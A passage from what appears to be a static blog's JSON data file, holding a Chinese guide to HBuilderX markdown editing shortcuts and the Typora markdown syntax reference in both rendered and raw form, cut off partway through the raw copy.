<ul>\n<li>Emmet：li后敲Tab可生成*号列表符，行首生效</li>\n<li>快捷键：Ctrl+Alt+8【8即*对应的数字】，支持多光标批量设置列表符，即按Ctrl+鼠标左键添加多光标</li>\n<li>智能双击：双击*号可选中整段无序列表</li>\n<li>智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动续列表；连续按回车会清除列表符；再次按Tab会更换列表符；在列表符后回车或行尾Shift+回车，上一行留出列表符</li>\n<li>*号常用于二级列表，列表符后继续Tab，可切换列表符</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li>无序列表3 【快捷键：Ctrl+Alt+=；常用于三级列表；其他同上】</li>\n</ul>\n<h2 id=\"任务列表\"><a href=\"#任务列表\" class=\"headerlink\" title=\"任务列表\"></a>任务列表</h2><p>任务列表非常实用，管理待办、已办非常便利。<br>[ ] 任务列表-未完成任务 【快捷键：Ctrl+Alt+[】<br>[x] 任务列表-已完成任务 【快捷键：Ctrl+Alt+]】<br>    1. 智能双击：双击方括号内可切换勾选状态，把任务标记为完成或未完成；双击方括号右侧可选中任务列表段落<br>    2. 智能回车：回车后自动补任务列表前缀符号；连续按回车清除前缀符号；在列表符后回车或行尾Shift+回车，上一行留出列表符</p>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 如需发布到web渲染，需增加无序列表- 的前缀</li>\n</ul>\n<p>以上三种列表，均支持批量修改列表符，有如下方式建议依次学习尝试：</p>\n<ol>\n<li>选中多行，按快捷键Ctrl+Alt+“1”或“-”或“[”或“]”，批量设置列表符</li>\n<li>如果需要跳行设置有序或无序列表，通过Ctrl+鼠标左键点中目标多行（可不连续），产生多光标，然后按快捷键Ctrl+Alt+“1”或“-”或“[”或“]”，可跳行设置列表符，尤其是有序列表，数字也会跳行加1</li>\n<li>按Alt+鼠标选中行首那列（列选择），这样每行行首都有光标，然后再键入或删除列表符即可批量操作</li>\n<li>选中多行，按快捷键Ctrl+Shift+\\（其实就是Ctrl+|），可以在每行行首添加一个光标</li>\n</ol>\n<h2 id=\"引用列表\"><a href=\"#引用列表\" class=\"headerlink\" title=\"引用列表\"></a>引用列表</h2><blockquote>\n<p>引用1<br>引用2<br>快捷键：Ctrl+Alt+Shift+.<br>智能双击：双击&gt;号可选中整段引用列表<br>智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动续列表；连续按回车会清除列表符；在列表符后回车或行尾Shift+回车，上一行留出列表符</p>\n</blockquote>\n<h1 id=\"文字样式语法\"><a href=\"#文字样式语法\" class=\"headerlink\" title=\"文字样式语法\"></a>文字样式语法</h1><p><strong>加粗</strong> 【快捷键：Ctrl+B，支持多光标；Emmet：b后敲Tab】<br><strong>加粗2</strong><br><em>倾斜_【Emmet：i后敲Tab；前后包围：选中文字按Ctrl+\\是在选区两侧添加光标，可以继续输入_】<br><em>倾斜</em><br><del>删除线</del><br><code>单行代码</code><br>包围插入：先选中文字内容，然后按</em>*~`等符号，会自动在2侧加包围<br>智能双击：双击语法区前面的定义符号，选中包含定义符的整段文字<br>去包围：选中整段文字后，按Ctrl+Shift+]，可去除2侧包围符号</p>\n<p>引号括号虽然不属于markdown语法，但也支持相同的包围、选择、去包围操作。<br>引号括号智能双击选择时略特殊的是：双击引号括号内侧，选中引号括号里的内容(不含引号括号)；按下Alt+双击引号括号内侧，则选中包含符号的整段文字</p>\n<p>HBuilderX还支持以下对2侧文本高效处理的手段</p>\n<ol>\n<li>选中文字按Ctrl+\\是在选区两侧添加光标，可以继续输入~~，会在2侧同时输入</li>\n<li>向2侧扩大选择：【Win:Alt+Shit+→ 、Mac:Ctrl++Shit+→】；由2侧向内减少选择：【Win:Alt+Shit+← 、Mac:Ctrl++Shit+←】</li>\n</ol>\n<p><a href=\"http://dcloud.io\">链接文字</a></p>\n<ol>\n<li>Emmet：a后敲Tab</li>\n<li>打开链接：Alt+鼠标单击；如果是本地文件，可通过Shift+Alt+单击，在另一分栏打开文件</li>\n<li>智能粘贴：粘贴URL会自动变成超链接格式；粘贴本地文件进来也会自动创建引用链接</li>\n<li>智能双击：双击语法区开头，即[左侧，选中包含定义符的整段文字</li>\n</ol>\n<p><img src=\"logo.jpg\" alt=\"图片描述文字\"></p>\n<ol>\n<li>Emmet：img后敲Tab</li>\n<li>智能粘贴：粘贴剪切板里的图形时会自动保存为本md文档的附件；删除文档中的图片语法，保存md文档时会自动删除对应的图片附件；粘贴图片文件时自动变成链接引用格式；</li>\n<li>悬浮预览：鼠标移到图片语法上，本地图片会自动显示出来</li>\n<li>智能双击：双击语法区开头，即!左侧，选中包含定义符的整段文字</li>\n</ol>\n<h1 id=\"表格\"><a href=\"#表格\" class=\"headerlink\" title=\"表格\"></a>表格</h1><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<ol>\n<li>Emmet：table3*3后敲Tab，表示生成3行3列的表格，行首生效</li>\n<li>md表格对齐是传统md的痛点，按下Ctrl+K可以自动整理表格格式（暂未兼容不同缩放模式和字体的情况）</li>\n<li>支持从excel、wps、word、number的表格中复制粘贴表格进来（不支持合并单元格和单元格换行）</li>\n</ol>\n<h1 id=\"分割线\"><a href=\"#分割线\" class=\"headerlink\" title=\"分割线\"></a>分割线</h1><p>————- 【Emmet：hr后敲Tab】</p>\n<hr>\n<p>=============</p>\n<h1 id=\"代码区\"><a href=\"#代码区\" class=\"headerlink\" title=\"代码区\"></a>代码区</h1><pre><code class=\"javascript\">    var a = document</code></pre>\n<p>Emmet：code后敲Tab，行首生效<br>智能双击：双击语法区开头，即!左侧，选中包含定义符的整段文字<br>支持代码直接高亮着色，这应该是只有HBuilderX才有的功能。注意需要在代码区开头指定语言类型</p>\n<h1 id=\"注释\"><a href=\"#注释\" class=\"headerlink\" title=\"注释\"></a>注释</h1><!--注释--> \n<p>快捷键：Ctrl+/<br>智能双击：双击注释首尾的定义符，选中整段注释</p>\n<h1 id=\"其他emmet快捷输入\"><a href=\"#其他emmet快捷输入\" class=\"headerlink\" title=\"其他emmet快捷输入\"></a>其他emmet快捷输入</h1><p>day后敲Tab，当前日期。注意day需在行首或前面有空格<br>time后敲Tab，当前时间。注意time需在行首或前面有空格</p>\n<h1 id=\"文档结构图\"><a href=\"#文档结构图\" class=\"headerlink\" title=\"文档结构图\"></a>文档结构图</h1><p>文章很长时，word里有文档结构图，HBuilderX也有。<br>菜单视图-文档结构图，快捷键Alt+W(mac是ctrl+W)，轻松管理长文档</p>\n<h1 id=\"运行、预览和打印PDF\"><a href=\"#运行、预览和打印PDF\" class=\"headerlink\" title=\"运行、预览和打印PDF\"></a>运行、预览和打印PDF</h1><p>对md文件点工具栏或菜单里的浏览器运行，可以使用外部浏览器预览此md文件，会自动渲染为HTML。<br>点右上角的预览【快捷键Alt+p】，可在HBuilderX右侧预览该md文档的HTML渲染结果。<br>在浏览器中点打印，选择打印到PDF，可将md输出为PDF格式。（注意在打印选项里去掉页眉页脚）</p>\n<h1 id=\"其他常用但你可能不知道的快捷操作技巧\"><a href=\"#其他常用但你可能不知道的快捷操作技巧\" class=\"headerlink\" title=\"其他常用但你可能不知道的快捷操作技巧\"></a>其他常用但你可能不知道的快捷操作技巧</h1><ul>\n<li>Ctrl+鼠标左键添加多光标，然后敲字或粘贴，可批量处理。Ctrl+鼠标左键拖选，可选中多个选区。</li>\n<li>Ctrl+鼠标右键删除多光标</li>\n<li>不选内容按Ctrl+C或X可复制或剪切整行</li>\n<li>选中2个选区后，按Ctrl+Shift+X，可互换选区内容。如无选区，只是2个光标，则互换2行</li>\n<li>Ctrl+上下键可上下移动行</li>\n<li>Ctrl+Insert可重复插入当前行，如果有选中内容，可重复插入选中内容</li>\n<li>Ctrl+Shift+K可合并多行（是格式化Ctrl+K的反操作）</li>\n<li>删除<ul>\n<li>按Ctrl+D可删除选中行，支持多光标</li>\n<li>Shift+Del删除到行尾</li>\n<li>Shift+Backspace删除到行首</li>\n</ul>\n</li>\n<li>选择<ul>\n<li>Ctrl+E选相同词(mac是Command+D)，连续按可选中多词进一步操作，比替换更方便</li>\n<li>Ctrl+L可连选多行，Ctrl+Shift+L也是选择行，但不选行首尾的空白字符</li>\n<li>Ctrl+=可逐级放大选区</li>\n<li>双击标题、列表符可选中相应段落</li>\n<li>双击英文引号、括号内侧，可选中内部内容</li>\n<li>双击缩进符，可选中同缩进段落</li>\n<li>双击连字符比如-或_，可选中相连的词，比如双击这里试试，uni-app</li>\n</ul>\n</li>\n<li>查找<ul>\n<li>Ctrl+P查找文件</li>\n<li>Ctrl+Alt+F可在当前目录的所有文档中搜索指定关键字(mac是Command+Shift+f)</li>\n<li>选中文字按F3，查找下一个，Shift+F3找上一个</li>\n</ul>\n</li>\n<li>云同步：HBuilderX+markdown用于云同步笔记的技巧，请参考<a href=\"http://ask.dcloud.net.cn/article/13097\">http://ask.dcloud.net.cn/article/13097</a></li>\n</ul>\n<p>都学会了吗？<br>markdown语法其实很简单，认真学半小时就能掌握。<br>HBuilderX的极客操作则需要不停反复练习，熟练掌握这些技巧，你将成为高效极客！</p>"},{"title":"Markdown_doc_for_Typora","date":"2020-10-20T16:00:00.000Z","comments":1,"_content":"\n\n\n# Markdown For Typora\n\n## Overview\n\n**Markdown** is created by [Daring Fireball](http://daringfireball.net/); the original guideline is [here](http://daringfireball.net/projects/markdown/syntax). Its syntax, however, varies between different parsers or editors. **Typora** is using [GitHub Flavored Markdown][GFM].\n\n<!--more-->\n\n[toc]\n\n## Block Elements\n\n### Paragraph and line breaks\n\nA paragraph is simply one or more consecutive lines of text. In markdown source code, paragraphs are separated by two or more blank lines. In Typora, you only need one blank line (press `Return` once) to create a new paragraph.\n\nPress `Shift` + `Return` to create a single line break. Most other markdown parsers will ignore single line breaks, so in order to make other markdown parsers recognize your line break, you can leave two spaces at the end of the line, or insert `<br/>`.\n\n### Headers\n\nHeaders use 1-6 hash (`#`) characters at the start of the line, corresponding to header levels 1-6. For example:\n\n``` markdown\n# This is an H1\n\n## This is an H2\n\n###### This is an H6\n```\n\nIn Typora, input ‘#’s followed by title content, and press `Return` key will create a header.\n\n### Blockquotes\n\nMarkdown uses email-style > characters for block quoting. They are presented as:\n\n``` markdown\n> This is a blockquote with two paragraphs. This is first paragraph.\n>\n> This is second pragraph. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.\n\n\n\n> This is another blockquote with one paragraph. There is three empty line to seperate two blockquote.\n```\n\nIn Typora, inputting ‘>’ followed by your quote contents will generate a quote block. Typora will insert a proper ‘>’ or line break for you. Nested block quotes (a block quote inside another block quote) by adding additional levels of ‘>’.\n\n### Lists\n\nInput `* list item 1` will create an unordered list - the `*` symbol can be replace with `+` or `-`.\n\nInput `1. list item 1` will create an ordered list - their markdown source code is as follows:\n\n``` markdown\n## un-ordered list\n*   Red\n*   Green\n*   Blue\n\n## ordered list\n1.  Red\n2. \tGreen\n3.\tBlue\n```\n\n### Task List\n\nTask lists are lists with items marked as either [ ] or [x] (incomplete or complete). For example:\n\n``` markdown\n- [ ] a task list item\n- [ ] list syntax required\n- [ ] normal **formatting**, @mentions, #1234 refs\n- [ ] incomplete\n- [x] completed\n```\n\nYou can change the complete/incomplete state by clicking on the checkbox before the item.\n\n### (Fenced) Code Blocks\n\nTypora only supports fences in GitHub Flavored Markdown. Original code blocks in markdown are not supported.\n\nUsing fences is easy: Input \\`\\`\\` and press `return`. Add an optional language identifier after \\`\\`\\` and we'll run it through syntax highlighting:\n\n``` markdown\nHere's an example:\n\n​```\nfunction test() {\n  console.log(\"notice the blank line before this function?\");\n}\n​```\n\nsyntax highlighting:\n​```ruby\nrequire 'redcarpet'\nmarkdown = Redcarpet.new(\"Hello World!\")\nputs markdown.to_html\n​```\n```\n\n### Math Blocks\n\nYou can render *LaTeX* mathematical expressions using **MathJax**.\n\nTo add a mathematical expression, input `$$` and press the 'Return' key. This will trigger an input field which accepts *Tex/LaTex* source. For example:\n\n\n$$\n\\mathbf{V}_1 \\times \\mathbf{V}_2 =  \\begin{vmatrix}\n\\mathbf{i} & \\mathbf{j} & \\mathbf{k} \\\\\n\\frac{\\partial X}{\\partial u} &  \\frac{\\partial Y}{\\partial u} & 0 \\\\\n\\frac{\\partial X}{\\partial v} &  \\frac{\\partial Y}{\\partial v} & 0 \\\\\n\\end{vmatrix}\n$$\n\n\nIn the markdown source file, the math block is a *LaTeX* expression wrapped by a pair of ‘$$’ marks:\n\n``` markdown\n$$\n\\mathbf{V}_1 \\times \\mathbf{V}_2 =  \\begin{vmatrix}\n\\mathbf{i} & \\mathbf{j} & \\mathbf{k} \\\\\n\\frac{\\partial X}{\\partial u} &  \\frac{\\partial Y}{\\partial u} & 0 \\\\\n\\frac{\\partial X}{\\partial v} &  \\frac{\\partial Y}{\\partial v} & 0 \\\\\n\\end{vmatrix}\n$$\n```\n\nYou can find more details [here](https://support.typora.io/Math/).\n\n### Tables\n\nInput `| First Header  | Second Header |` and press the `return` key. This will create a table with two columns.\n\nAfter a table is created, putting focus on that table will open up a toolbar for the table where you can resize, align, or delete the table. You can also use the context menu to copy and add/delete individual columns/rows.\n\nThe full syntax for tables is described below, but it is not necessary to know the full syntax in detail as the markdown source code for tables is generated automatically by Typora.\n\nIn markdown source code, they look like:\n\n``` markdown\n| First Header  | Second Header |\n| ------------- | ------------- |\n| Content Cell  | Content Cell  |\n| Content Cell  | Content Cell  |\n```\n\nYou can also include inline Markdown such as links, bold, italics, or strikethrough in the table.\n\nFinally, by including colons (`:`) within the header row, you can define text in that column to be left-aligned, right-aligned, or center-aligned:\n\n``` markdown\n| Left-Aligned  | Center Aligned  | Right Aligned |\n| :------------ |:---------------:| -----:|\n| col 3 is      | some wordy text | $1600 |\n| col 2 is      | centered        |   $12 |\n| zebra stripes | are neat        |    $1 |\n```\n\nA colon on the left-most side indicates a left-aligned column; a colon on the right-most side indicates a right-aligned column; a colon on both sides indicates a center-aligned column.\n\n### Footnotes\n\n``` markdown\nYou can create footnotes like this[^footnote].\n\n[^footnote]: Here is the *text* of the **footnote**.\n```\n\nwill produce:\n\nYou can create footnotes like this[^footnote].\n\n[^footnote]: Here is the *text* of the **footnote**.\n\nHover over the ‘footnote’ superscript to see content of the footnote.\n\n### Horizontal Rules\n\nInputting `***` or `---` on a blank line and pressing `return` will draw a horizontal line.\n\n------\n\n### YAML Front Matter\n\nTypora now supports [YAML Front Matter](http://jekyllrb.com/docs/frontmatter/). Input `---` at the top of the article and then press `Return` to introduce a metadata block. Alternatively, you can insert a metadata block from the top menu of Typora.\n\n### Table of Contents (TOC)\n\nInput `[toc]` and press the `Return` key. This will create a  “Table of Contents” section. The TOC extracts all headers from the document, and its contents are updated automatically as you add to the document.\n\n## Span Elements\n\nSpan elements will be parsed and rendered right after typing. Moving the cursor in middle of those span elements will expand those elements into markdown source. Below is an explanation of the syntax for each span element.\n\n### Links\n\nMarkdown supports two styles of links: inline and reference.\n\nIn both styles, the link text is delimited by [square brackets].\n\nTo create an inline link, use a set of regular parentheses immediately after the link text’s closing square bracket. Inside the parentheses, put the URL where you want the link to point, along with an optional title for the link, surrounded in quotes. For example:\n\n``` markdown\nThis is [an example](http://example.com/ \"Title\") inline link.\n\n[This link](http://example.net/) has no title attribute.\n```\n\nwill produce:\n\nThis is [an example](http://example.com/ \"Title\") inline link. (`<p>This is <a href=\"http://example.com/\" title=\"Title\">`)\n\n[This link](http://example.net/) has no title attribute. (`<p><a href=\"http://example.net/\">This link</a> has no`)\n\n#### Internal Links\n\n**You can set the href to headers**, which will create a bookmark that allow you to jump to that section after clicking. For example:\n\nCommand(on Windows: Ctrl) + Click [This link](#block-elements) will jump to header `Block Elements`. To see how to write that, please move cursor or click that link with `⌘` key pressed to expand the element into markdown source.\n\n#### Reference Links\n\nReference-style links use a second set of square brackets, inside which you place a label of your choosing to identify the link:\n\n``` markdown\nThis is [an example][id] reference-style link.\n\nThen, anywhere in the document, you define your link label on a line by itself like this:\n\n[id]: http://example.com/  \"Optional Title Here\"\n```\n\nIn Typora, they will be rendered like so:\n\nThis is [an example][id] reference-style link.\n\n[id]: http://example.com/\t\"Optional Title Here\"\n\nThe implicit link name shortcut allows you to omit the name of the link, in which case the link text itself is used as the name. Just use an empty set of square brackets — for example, to link the word “Google” to the google.com web site, you could simply write:\n\n``` markdown\n[Google][]\nAnd then define the link:\n\n[Google]: http://google.com/\n```\n\nIn Typora, clicking the link will expand it for editing, and command+click will open the hyperlink in your web browser.\n\n### URLs\n\nTypora allows you to insert URLs as links, wrapped by `<`brackets`>`.\n\n`<i@typora.io>` becomes <i@typora.io>.\n\nTypora will also automatically link standard URLs. e.g: www.google.com.\n\n### Images\n\nImages have similar syntax as links, but they require an additional `!` char before the start of the link. The syntax for inserting an image looks like this:\n\n``` markdown\n![Alt text](/path/to/img.jpg)\n\n![Alt text](/path/to/img.jpg \"Optional title\")\n```\n\nYou are able to use drag & drop to insert an image from an image file or your web browser. You can modify the markdown source code by clicking on the image. A relative path will be used if the image that is added using drag & drop is in same directory or sub-directory as the document you're currently editing.\n\nIf you’re using markdown for building websites, you may specify a URL prefix for the image preview on your local computer with property `typora-root-url` in YAML Front Matters. For example, input `typora-root-url:/User/Abner/Website/typora.io/` in YAML Front Matters, and then `![alt](/blog/img/test.png)` will be treated as `![alt](file:///User/Abner/Website/typora.io/blog/img/test.png)` in Typora.\n\nYou can find more details [here](https://support.typora.io/Images/).\n\n### Emphasis\n\nMarkdown treats asterisks (`*`) and underscores (`_`) as indicators of emphasis. Text wrapped with one `*` or `_` will be wrapped with an HTML `<em>` tag. E.g:\n\n``` markdown\n*single asterisks*\n\n_single underscores_\n```\n\noutput:\n\n*single asterisks*\n\n_single underscores_\n\nGFM will ignore underscores in words, which is commonly used in code and names, like this:\n\n> wow_great_stuff\n>\n> do_this_and_do_that_and_another_thing.\n\nTo produce a literal asterisk or underscore at a position where it would otherwise be used as an emphasis delimiter, you can backslash escape it:\n\n``` markdown\n\\*this text is surrounded by literal asterisks\\*\n```\n\nTypora recommends using the `*` symbol.\n\n### Strong\n\nA double `*` or `_` will cause its enclosed contents to be wrapped with an HTML `<strong>` tag, e.g:\n\n``` markdown\n**double asterisks**\n\n__double underscores__\n```\n\noutput:\n\n**double asterisks**\n\n__double underscores__\n\nTypora recommends using the `**` symbol.\n\n### Code\n\nTo indicate an inline span of code, wrap it with backtick quotes (`). Unlike a pre-formatted code block, a code span indicates code within a normal paragraph. For example:\n\n``` markdown\nUse the `printf()` function.\n```\n\nwill produce:\n\nUse the `printf()` function.\n\n### Strikethrough\n\nGFM adds syntax to create strikethrough text, which is missing from standard Markdown.\n\n`~~Mistaken text.~~` becomes ~~Mistaken text.~~\n\n### Underlines\n\nUnderline is powered by raw HTML.\n\n`<u>Underline</u>` becomes <u>Underline</u>.\n\n### Emoji :smile:\n\nInput emoji with syntax `:smile:`.\n\nUser can trigger auto-complete suggestions for emoji by pressing `ESC` key, or trigger it automatically after enabling it on preference panel. Also, inputting UTF-8 emoji characters directly is also supported by going to `Edit` -> `Emoji & Symbols` in the menu bar (macOS).\n\n### Inline Math\n\nTo use this feature, please enable it first in the `Preference` Panel -> `Markdown` Tab. Then, use `$` to wrap a TeX command. For example: `$\\lim_{x \\to \\infty} \\exp(-x) = 0$` will be rendered as LaTeX command.\n\nTo trigger inline preview for inline math: input “$”, then press the `ESC` key, then input a TeX command.\n\nYou can find more details [here](https://support.typora.io/Math/).\n\n### Subscript\n\nTo use this feature, please enable it first in the `Preference` Panel -> `Markdown` Tab. Then, use `~` to wrap subscript content. For example: `H~2~O`, `X~long\\ text~`/\n\n### Superscript\n\nTo use this feature, please enable it first in the `Preference` Panel -> `Markdown` Tab. Then, use `^` to wrap superscript content. For example: `X^2^`.\n\n### Highlight\n\nTo use this feature, please enable it first in the `Preference` Panel -> `Markdown` Tab. Then, use `==` to wrap highlight content. For example: `==highlight==`.\n\n## HTML\n\nYou can use HTML to style content what pure Markdown does not support. For example, use `<span style=\"color:red\">this text is red</span>` to add text with red color.\n\n### Embed Contents\n\nSome websites provide iframe-based embed code which you can also paste into Typora. For example:\n\n```Markdown\n<iframe height='265' scrolling='no' title='Fancy Animated SVG Menu' src='http://codepen.io/jeangontijo/embed/OxVywj/?height=265&theme-id=0&default-tab=css,result&embed-version=2' frameborder='no' allowtransparency='true' allowfullscreen='true' style='width: 100%;'></iframe>\n```\n\n### Video\n\nYou can use the `<video>` HTML tag to embed videos. For example:\n\n```Markdown\n<video src=\"xxx.mp4\" />\n```\n\n### Other HTML Support\n\nYou can find more details [here](https://support.typora.io/HTML/).\n\n[GFM]: https://help.github.com/articles/github-flavored-markdown/","source":"_posts/Markdown_Typora.md","raw":"---\ntitle: Markdown_doc_for_Typora\ndate: 2020/10/21 \ncomments: ture\ncategories:\n- Markdown\ntags:\n- Markdown\n---\n\n\n\n# Markdown For Typora\n\n## Overview\n\n**Markdown** is created by [Daring Fireball](http://daringfireball.net/); the original guideline is [here](http://daringfireball.net/projects/markdown/syntax). Its syntax, however, varies between different parsers or editors. **Typora** is using [GitHub Flavored Markdown][GFM].\n\n<!--more-->\n\n[toc]\n\n## Block Elements\n\n### Paragraph and line breaks\n\nA paragraph is simply one or more consecutive lines of text. In markdown source code, paragraphs are separated by two or more blank lines. In Typora, you only need one blank line (press `Return` once) to create a new paragraph.\n\nPress `Shift` + `Return` to create a single line break. Most other markdown parsers will ignore single line breaks, so in order to make other markdown parsers recognize your line break, you can leave two spaces at the end of the line, or insert `<br/>`.\n\n### Headers\n\nHeaders use 1-6 hash (`#`) characters at the start of the line, corresponding to header levels 1-6. For example:\n\n``` markdown\n# This is an H1\n\n## This is an H2\n\n###### This is an H6\n```\n\nIn Typora, input ‘#’s followed by title content, and press `Return` key will create a header.\n\n### Blockquotes\n\nMarkdown uses email-style > characters for block quoting. They are presented as:\n\n``` markdown\n> This is a blockquote with two paragraphs. This is first paragraph.\n>\n> This is second pragraph. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.\n\n\n\n> This is another blockquote with one paragraph. There is three empty line to seperate two blockquote.\n```\n\nIn Typora, inputting ‘>’ followed by your quote contents will generate a quote block. Typora will insert a proper ‘>’ or line break for you. Nested block quotes (a block quote inside another block quote) by adding additional levels of ‘>’.\n\n### Lists\n\nInput `* list item 1` will create an unordered list - the `*` symbol can be replace with `+` or `-`.\n\nInput `1. list item 1` will create an ordered list - their markdown source code is as follows:\n\n``` markdown\n## un-ordered list\n*   Red\n*   Green\n*   Blue\n\n## ordered list\n1.  Red\n2. \tGreen\n3.\tBlue\n```\n\n### Task List\n\nTask lists are lists with items marked as either [ ] or [x] (incomplete or complete). For example:\n\n``` markdown\n- [ ] a task list item\n- [ ] list syntax required\n- [ ] normal **formatting**, @mentions, #1234 refs\n- [ ] incomplete\n- [x] completed\n```\n\nYou can change the complete/incomplete state by clicking on the checkbox before the item.\n\n### (Fenced) Code Blocks\n\nTypora only supports fences in GitHub Flavored Markdown. Original code blocks in markdown are not supported.\n\nUsing fences is easy: Input \\`\\`\\` and press `return`. Add an optional language identifier after \\`\\`\\` and we'll run it through syntax highlighting:\n\n``` markdown\nHere's an example:\n\n​```\nfunction test() {\n  console.log(\"notice the blank line before this function?\");\n}\n​```\n\nsyntax highlighting:\n​```ruby\nrequire 'redcarpet'\nmarkdown = Redcarpet.new(\"Hello World!\")\nputs markdown.to_html\n​```\n```\n\n### Math Blocks\n\nYou can render *LaTeX* mathematical expressions using **MathJax**.\n\nTo add a mathematical expression, input `$$` and press the 'Return' key. This will trigger an input field which accepts *Tex/LaTex* source. For example:\n\n\n$$\n\\mathbf{V}_1 \\times \\mathbf{V}_2 =  \\begin{vmatrix}\n\\mathbf{i} & \\mathbf{j} & \\mathbf{k} \\\\\n\\frac{\\partial X}{\\partial u} &  \\frac{\\partial Y}{\\partial u} & 0 \\\\\n\\frac{\\partial X}{\\partial v} &  \\frac{\\partial Y}{\\partial v} & 0 \\\\\n\\end{vmatrix}\n$$\n\n\nIn the markdown source file, the math block is a *LaTeX* expression wrapped by a pair of ‘$$’ marks:\n\n``` markdown\n$$\n\\mathbf{V}_1 \\times \\mathbf{V}_2 =  \\begin{vmatrix}\n\\mathbf{i} & \\mathbf{j} & \\mathbf{k} \\\\\n\\frac{\\partial X}{\\partial u} &  \\frac{\\partial Y}{\\partial u} & 0 \\\\\n\\frac{\\partial X}{\\partial v} &  \\frac{\\partial Y}{\\partial v} & 0 \\\\\n\\end{vmatrix}\n$$\n```\n\nYou can find more details [here](https://support.typora.io/Math/).\n\n### Tables\n\nInput `| First Header  | Second Header |` and press the `return` key. This will create a table with two columns.\n\nAfter a table is created, putting focus on that table will open up a toolbar for the table where you can resize, align, or delete the table. You can also use the context menu to copy and add/delete individual columns/rows.\n\nThe full syntax for tables is described below, but it is not necessary to know the full syntax in detail as the markdown source code for tables is generated automatically by Typora.\n\nIn markdown source code, they look like:\n\n``` markdown\n| First Header  | Second Header |\n| ------------- | ------------- |\n| Content Cell  | Content Cell  |\n| Content Cell  | Content Cell  |\n```\n\nYou can also include inline Markdown such as links, bold, italics, or strikethrough in the table.\n\nFinally, by including colons (`:`) within the header row, you can define text in that column to be left-aligned, right-aligned, or center-aligned:\n\n``` markdown\n| Left-Aligned  | Center Aligned  | Right Aligned |\n| :------------ |:---------------:| -----:|\n| col 3 is      | some wordy text | $1600 |\n| col 2 is      | centered        |   $12 |\n| zebra stripes | are neat        |    $1 |\n```\n\nA colon on the left-most side indicates a left-aligned column; a colon on the right-most side indicates a right-aligned column; a colon on both sides indicates a center-aligned column.\n\n### Footnotes\n\n``` markdown\nYou can create footnotes like this[^footnote].\n\n[^footnote]: Here is the *text* of the **footnote**.\n```\n\nwill produce:\n\nYou can create footnotes like this[^footnote].\n\n[^footnote]: Here is the *text* of the **footnote**.\n\nHover over the ‘footnote’ superscript to see content of the footnote.\n\n### Horizontal Rules\n\nInputting `***` or `---` on a blank line and pressing `return` will draw a horizontal line.\n\n------\n\n### YAML Front Matter\n\nTypora now supports [YAML Front Matter](http://jekyllrb.com/docs/frontmatter/). Input `---` at the top of the article and then press `Return` to introduce a metadata block. Alternatively, you can insert a metadata block from the top menu of Typora.\n\n### Table of Contents (TOC)\n\nInput `[toc]` and press the `Return` key. This will create a  “Table of Contents” section. The TOC extracts all headers from the document, and its contents are updated automatically as you add to the document.\n\n## Span Elements\n\nSpan elements will be parsed and rendered right after typing. Moving the cursor in middle of those span elements will expand those elements into markdown source. Below is an explanation of the syntax for each span element.\n\n### Links\n\nMarkdown supports two styles of links: inline and reference.\n\nIn both styles, the link text is delimited by [square brackets].\n\nTo create an inline link, use a set of regular parentheses immediately after the link text’s closing square bracket. Inside the parentheses, put the URL where you want the link to point, along with an optional title for the link, surrounded in quotes. For example:\n\n``` markdown\nThis is [an example](http://example.com/ \"Title\") inline link.\n\n[This link](http://example.net/) has no title attribute.\n```\n\nwill produce:\n\nThis is [an example](http://example.com/ \"Title\") inline link. (`<p>This is <a href=\"http://example.com/\" title=\"Title\">`)\n\n[This link](http://example.net/) has no title attribute. (`<p><a href=\"http://example.net/\">This link</a> has no`)\n\n#### Internal Links\n\n**You can set the href to headers**, which will create a bookmark that allow you to jump to that section after clicking. For example:\n\nCommand(on Windows: Ctrl) + Click [This link](#block-elements) will jump to header `Block Elements`. To see how to write that, please move cursor or click that link with `⌘` key pressed to expand the element into markdown source.\n\n#### Reference Links\n\nReference-style links use a second set of square brackets, inside which you place a label of your choosing to identify the link:\n\n``` markdown\nThis is [an example][id] reference-style link.\n\nThen, anywhere in the document, you define your link label on a line by itself like this:\n\n[id]: http://example.com/  \"Optional Title Here\"\n```\n\nIn Typora, they will be rendered like so:\n\nThis is [an example][id] reference-style link.\n\n[id]: http://example.com/\t\"Optional Title Here\"\n\nThe implicit link name shortcut allows you to omit the name of the link, in which case the link text itself is used as the name. Just use an empty set of square brackets — for example, to link the word “Google” to the google.com web site, you could simply write:\n\n``` markdown\n[Google][]\nAnd then define the link:\n\n[Google]: http://google.com/\n```\n\nIn Typora, clicking the link will expand it for editing, and command+click will open the hyperlink in your web browser.\n\n### URLs\n\nTypora allows you to insert URLs as links, wrapped by `<`brackets`>`.\n\n`<i@typora.io>` becomes <i@typora.io>.\n\nTypora will also automatically link standard URLs. e.g: www.google.com.\n\n### Images\n\nImages have similar syntax as links, but they require an additional `!` char before the start of the link. The syntax for inserting an image looks like this:\n\n``` markdown\n![Alt text](/path/to/img.jpg)\n\n![Alt text](/path/to/img.jpg \"Optional title\")\n```\n\nYou are able to use drag & drop to insert an image from an image file or your web browser. You can modify the markdown source code by clicking on the image. A relative path will be used if the image that is added using drag & drop is in same directory or sub-directory as the document you're currently editing.\n\nIf you’re using markdown for building websites, you may specify a URL prefix for the image preview on your local computer with property `typora-root-url` in YAML Front Matters. For example, input `typora-root-url:/User/Abner/Website/typora.io/` in YAML Front Matters, and then `![alt](/blog/img/test.png)` will be treated as `![alt](file:///User/Abner/Website/typora.io/blog/img/test.png)` in Typora.\n\nYou can find more details [here](https://support.typora.io/Images/).\n\n### Emphasis\n\nMarkdown treats asterisks (`*`) and underscores (`_`) as indicators of emphasis. Text wrapped with one `*` or `_` will be wrapped with an HTML `<em>` tag. E.g:\n\n``` markdown\n*single asterisks*\n\n_single underscores_\n```\n\noutput:\n\n*single asterisks*\n\n_single underscores_\n\nGFM will ignore underscores in words, which is commonly used in code and names, like this:\n\n> wow_great_stuff\n>\n> do_this_and_do_that_and_another_thing.\n\nTo produce a literal asterisk or underscore at a position where it would otherwise be used as an emphasis delimiter, you can backslash escape it:\n\n``` markdown\n\\*this text is surrounded by literal 